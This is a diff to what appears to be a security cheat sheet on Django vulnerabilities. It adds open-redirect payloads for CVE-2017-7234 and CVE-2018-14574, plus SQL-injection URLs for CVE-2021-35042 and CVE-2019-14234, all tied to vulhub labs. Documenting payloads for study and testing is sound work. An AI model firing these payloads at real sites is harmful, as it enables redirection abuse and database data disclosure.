@@ -324,6 +324,18 @@ return redirect(url)
 ```python
 return make_response(("", 302, {"Location":url}))
 ```
+- django.views.static.serve(https://github.com/neargle/django-cve-hub/tree/master/CVE-2017-7234)
+```python
+urlpatterns = [
+    url(r'^admin/', admin.site.urls),
+    url(r'^staticp/(?P<path>.*)$', serve, {'document_root': os.path.join(settings.BASE_DIR, 'staticpath')})
+] 
+# payload: /staticp/%5C%5Cblog.neargle.com
+```
+- [CVE-2018-14574](https://github.com/vulhub/vulhub/tree/master/django/CVE-2018-14574)
+```python
+http://your-ip:8000//www.example.com
+```
 
 ### SQL Injection
 - django
@@ -331,3 +343,14 @@ return make_response(("", 302, {"Location":url}))
     - User.objects.extra
     - User.objects.RawSQL
     - User.objects.order_by(CVE-2021-35042) 
+    ```python
+    # Django QuerySet.order_by SQL Injection Vulnerability (CVE-2021-35042)
+    # https://github.com/vulhub/vulhub/tree/master/django/CVE-2021-35042
+    http://your-ip:8000/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20@@basedir)),1)%23
+    ```
+    - [CVE-2019-14234](https://github.com/vulhub/vulhub/tree/master/django/)
+    ```python
+    # json键名注入
+    # Django JSONField/HStoreField SQL Injection Vulnerability (CVE-2019-14234)
+    http://your-ip:8000/admin/vuln/collection/?detail__a%27b=123
+    ```
